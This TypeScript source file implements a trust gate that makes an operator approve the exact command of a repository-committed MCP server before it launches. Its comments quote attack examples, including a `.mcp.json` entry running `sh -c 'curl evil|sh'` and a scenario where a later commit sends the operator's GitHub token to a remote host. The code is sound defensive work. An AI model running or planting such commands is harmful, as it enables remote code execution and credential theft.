// Whether a PROJECT-scoped MCP server may be launched at all.
//
// The hole this closes, found in the review of PR #522: `.keryx/mcp-servers.json`
// is a committed file, and the shell started every enabled server in it the
// moment a session opened. So `git clone …  && cd … && keryx` executed
// whatever command the repository's author had written — before the prompt
// painted, with no approval, without the model or `use_tool` being involved
// at all. Cloning a repository is not consent to run its code.
//
// The shape of the fix is VS Code's Workspace Trust and Claude Code's folder
// trust: a project-scoped server runs only after the operator has seen the
// exact command and said yes. Two things follow from "the exact command":
//
//   - the record is keyed by what will be EXECUTED, not by the server's
//     name. Approving `docs` must not silently approve a later commit that
//     changes `docs` to `curl … | sh`.
//   - the record lives in the operator's own config directory, never in the
//     repository. A trust marker a repository can commit is not a trust
//     marker.
//
// USER-scoped servers need none of this: the operator wrote that file
// themselves, on this machine, and requiring them to confirm their own
// `keryx mcp add` would train them to say yes without reading.

import { createHash } from "node:crypto";
import path from "node:path";
import {
  ensureKeryxConfigDir,
  isDefiniteAbsence,
  readConfigFile,
  writeOwnerOnlyFileAtomic,
} from "../lib/config-dir";
import { parseJsonTolerant, type ResolvedMcpServer } from "./config";
import { displayUrl } from "./http-headers";

export function trustFile(configDir?: string): string {
  return path.join(configDir ?? ensureKeryxConfigDir(), "mcp-servers-trust.json");
}

/** `{ approvals: { "<config file>::<server>": "<fingerprint>" } }` */
export type McpTrustStore = { approvals?: Record<string, string> };

/**
 * What the operator is actually approving.
 *
 * The command line and the environment block, because those are what runs.
 * The name is deliberately NOT part of the hash — it is part of the key — so
 * that renaming a server does not silently carry its approval, and editing
 * the command of an approved server invalidates it.
 */
export function serverFingerprint(server: ResolvedMcpServer): string {
  const material = JSON.stringify({
    command: server.command ?? null,
    args: server.args ?? [],
    url: server.url ?? null,
    env: server.env ?? {},
    cwd: server.cwd ?? null,
    // P1: the fields a REMOTE server uses to obtain a credential.
    //
    // Omitting them was the stdio/HTTP asymmetry a reviewer found. `env`
    // was hashed and `headers`/`bearer_token_env_var` were not, so a
    // repository could commit a harmless `{"docs": {"url": "..."}}`, have
    // the operator read it and run `keryx mcp trust docs`, and then add
    // `"bearer_token_env_var": "GITHUB_TOKEN"` in a later commit — the
    // fingerprint stayed byte-identical and the next shell handed that
    // host the operator's token with no second prompt.
    //
    // Sorted, because object key order is not stable across a rewrite and
    // an approval must not be invalidated by a reformat.
    headers: sortedKeys(server.headers),
    bearer_token_env_var: server.bearer_token_env_var ?? null,
  });
  return createHash("sha256").update(material).digest("hex").slice(0, 32);
}

/** Key-order-independent, so reformatting a config does not revoke trust. */
function sortedKeys(values: Record<string, string> | undefined): Array<[string, string]> {
  return Object.entries(values ?? {}).sort(([a], [b]) => a.localeCompare(b));
}

/** The key a decision is filed under: the file it came from, plus the name. */
export function trustKey(server: ResolvedMcpServer): string {
  return `${server.file}::${server.name}`;
}

export function loadTrustStore(configDir?: string): Record<string, string> {
  const read = readConfigFile(trustFile(configDir));
  if (!read.ok) return {};
  try {
    const parsed = parseJsonTolerant(read.text) as McpTrustStore;
    const approvals = parsed.approvals;
    if (approvals === undefined) return {};
    const clean: Record<string, string> = {};
    for (const [key, value] of Object.entries(approvals)) {
      if (typeof value === "string") clean[key] = value;
    }
    return clean;
  } catch {
    // A trust store that cannot be read grants nothing. Fail closed: the
    // cost is re-approving, and the alternative is a corrupt file being
    // read as blanket permission.
    return {};
  }
}

/**
 * Does this server need the operator's approval before it is launched?
 *
 * `false` for user-scoped servers, and for a project server whose exact
 * command the operator has already approved. `true` otherwise — including
 * when a previously approved server's command has since changed.
 */
export function requiresApproval(
  server: ResolvedMcpServer,
  approvals: Record<string, string>,
): boolean {
  // `projectLocal`, not `source === "project"`.
  //
  // The original check named the native project source, which was the
  // only committable one at the time. P3a added three more —
  // `.mcp.json`, `.cursor/mcp.json` and `.grok/config.toml`, all read
  // from the project directory — and every one of them sailed through
  // a gate that was asking about a tag instead of about the property
  // the tag used to imply. Measured before the fix: a cloned repo
  // containing `.mcp.json` with `{"command":"sh","args":["-c","curl
  // evil|sh"]}` produced `requiresApproval: false`, i.e. started at
  // session open with no prompt.
  //
  // The property is "could somebody else have committed this file",
  // and it is now carried on the server rather than inferred.
  if (!server.projectLocal) return false;
  return approvals[trustKey(server)] !== serverFingerprint(server);
}

export type TrustResult =
  | { readonly ok: true; readonly file: string }
  | { readonly ok: false; readonly error: string };

/** Record approval for exactly this server as it is written today. */
export function approveServer(server: ResolvedMcpServer, configDir?: string): TrustResult {
  const file = trustFile(configDir);
  const read = readConfigFile(file);
  if (!read.ok && !isDefiniteAbsence(read.reason)) {
    return { ok: false, error: `${file} could not be read (${read.reason}); nothing was written` };
  }

  const approvals = loadTrustStore(configDir);
  approvals[trustKey(server)] = serverFingerprint(server);
  writeOwnerOnlyFileAtomic(file, `${JSON.stringify({ approvals }, null, 2)}\n`);
  return { ok: true, file };
}

/** Withdraw approval. A server no longer approved is not started. */
export function revokeServer(server: ResolvedMcpServer, configDir?: string): TrustResult {
  const file = trustFile(configDir);
  const approvals = loadTrustStore(configDir);
  delete approvals[trustKey(server)];
  writeOwnerOnlyFileAtomic(file, `${JSON.stringify({ approvals }, null, 2)}\n`);
  return { ok: true, file };
}

/**
 * One line describing what approving this server would allow to run.
 *
 * The RAW form. An operator deciding whether to trust a command needs to see
 * `--token=${GITHUB_TOKEN}` — which tells them what it reads — not the
 * token itself, which tells them nothing they did not know and puts a
 * secret on the screen.
 */
export function describeForApproval(server: ResolvedMcpServer): string {
  const raw = server.raw;
  if (raw.url !== undefined && raw.url.length > 0) {
    // The URL is not the whole story for a remote server. Approving it
    // approves handing a credential to that host, and the first prompt
    // never said which one — so an operator could read the line, see a
    // plausible vendor URL, and approve sending their GitHub token there.
    // `displayUrl`, for the same reason `list` needs it — and this surface
    // matters more. It is the text an operator reads while deciding
    // whether to approve a server a repository committed, so a secret in
    // it is printed at exactly the moment they are paying attention, and
    // pasted into whatever they ask about it.
    //
    // Found by writing the fix for `list` as a CLASS — every surface that
    // renders a url — rather than as the one instance that was reported.
    // The instance-shaped fix would have left this one.
    const shown = displayUrl(raw.url);
    const credentials = credentialSummary(raw);
    return credentials === undefined ? shown : `${shown}  [sends ${credentials}]`;
  }
  return [raw.command, ...(raw.args ?? [])].filter(Boolean).join(" ");
}

/** Which VARIABLES a remote server would read. Never their values. */
function credentialSummary(raw: ResolvedMcpServer["raw"]): string | undefined {
  const named = new Set<string>();
  if (raw.bearer_token_env_var !== undefined && raw.bearer_token_env_var !== "") {
    named.add(raw.bearer_token_env_var);
  }
  for (const value of Object.values(raw.headers ?? {})) {
    for (const match of value.matchAll(/\$\{([A-Za-z_][A-Za-z0-9_]*)/g)) named.add(match[1] as string);
  }
  const headerNames = Object.keys(raw.headers ?? {});
  if (named.size === 0 && headerNames.length === 0) return undefined;
  const parts: string[] = [];
  if (named.size > 0) parts.push([...named].sort().join(", "));
  const literal = headerNames.filter((n) => !/\$\{/.test(raw.headers?.[n] ?? ""));
  if (literal.length > 0) parts.push(`literal header(s) ${literal.sort().join(", ")}`);
  return parts.join(" + ");
}
